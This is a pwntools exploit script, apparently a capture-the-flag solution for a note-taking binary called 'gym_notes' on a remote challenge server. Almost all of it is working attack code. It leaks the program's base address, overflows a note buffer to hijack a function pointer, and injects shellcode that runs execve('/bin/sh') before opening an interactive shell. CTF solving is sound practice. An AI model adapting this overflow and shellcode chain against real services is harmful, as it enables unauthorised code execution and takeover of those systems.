from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess
import itertools as it

context.arch = "amd64"
context.word_size = 64
context.bits = 64
context.os = "linux"

file = "./gym_notes"
exe_args = []
io: process = None
PREFIX = b"> \n"

speed = 0.1

def debug():
    gdb.attach(io, gdbscript=
    """
    define funcs
    p *(void*[4]*)optionFuncs
    end
    """)
    input("debug")

def launch_remote():
    global file, io
    conn = "gym-notes.flu.xxx 1337"
    conn = conn.split(" ")
    io = remote(conn[0], conn[1])

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug()

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
sprefix = lambda a: sla(PREFIX, a)
choice = lambda a: snum(PREFIX, a)
show_leak = lambda a, b: success("%s: %#018x" % (a, b))

def launch():
    if args.REMOTE:
        l = launch_remote
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    libc = ELF("./libc.so.6")

tries = 0
# tries_prog = log.progress("Tries")
def exploit():
    def show(index):
        choice(1)
        choice(index)
        leak = recvu(b"\n\n\n1. Show")
        return getb(leak, b"Note consists of: ", b"\n\n\n1. Show")
    def add(data):
        choice(2)
        recvu(PREFIX)
        for i in range(0, len(data), 0x1000):
            io.send(data[i:i+0x1000])
            sleep(speed)
        io.send(b"\n")  
    def delete():
        choice(3)
        leak = recvu(b"\n1. Show")
        return int(getb(leak, b"Function ", b" isn't implemented"), 16)
    def edit(index, data):
        choice(4)
        choice(index)
        recvu(PREFIX)
        for i in range(0, len(data), 0x1000):
            io.send(data[i:i+0x1000])
            sleep(speed)
        io.send(b"\n")  
    
    exe.address = delete() - 0x16a6
    show_leak("exe", exe.address)

    add(b"A")
    edit(0, b"A"*0x80)


    payload = b"A"*0x3e8 + b"B"*0x120
    payload += flat([
        b"A"*8,
        exe.sym["allowFunctionsExec"],
    ]) + b"\0"
    payload = payload.ljust(65537, b"A")
    edit(0, payload)

    choice(2)
    leak = recvu(b"\n1. Show")
    heap = int(getb(leak, b"mprotect at ", b"..\n1. Show"), 16)
    show_leak("heap", heap)

    shellcode = asm(
"""
push rdx
pop rsi
xor edx, edx
dec edx
xor edi, edi
syscall
""")
    payload = b"A"*0x3e8 + b"B"*0x120
    payload += flat([
        (b"A" + shellcode).ljust(0x18, b"A"),
        heap+1,
    ]) + b"\0"
    payload = payload.ljust(65537, b"A")
    edit(0, payload)

    choice(4)
    shellcode2 = asm(
"""
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
xor esi, esi
xor edx, edx
push 0x3b
pop rax
syscall
""")
    payload = b"A"*(len(shellcode) + 1) + shellcode2
    io.send(payload)

    io.interactive()
    input("end")
    exit()

launch()
exploit()
exit()

while True:
    count = 0
    tries += 1
    tries_prog.status(str(tries))

    launch()
    try:
        exploit()
    except EOFError:
        pass

    with context.local(log_level=logging.ERROR):
        io.close()
    # sleep(0.05)
